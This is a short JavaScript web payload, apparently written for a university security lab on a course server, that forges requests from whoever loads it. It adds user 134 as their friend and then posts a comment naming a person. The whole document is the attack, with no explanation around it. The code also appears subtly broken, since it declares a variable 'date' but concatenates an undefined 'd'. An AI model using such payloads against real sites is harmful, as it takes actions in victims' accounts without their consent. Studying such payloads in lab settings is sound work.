<script>
    var xml = new XMLHttpRequest();
    xml.open("POST", "http://csec380-core.csec.rit.edu:86/add_friend.php?id%3D134", true);
    xml.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xml.send();

    var report = new XMLHttpRequest();
    var date = new Date();
    var url = 'http://csec380-core.csec.rit.edu:86/add_comment.php?id=134%26comment%3DFriended Patrick Marchione at '%2B d;
    report.open("POST", url, true);
    report.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    report.send();
</script>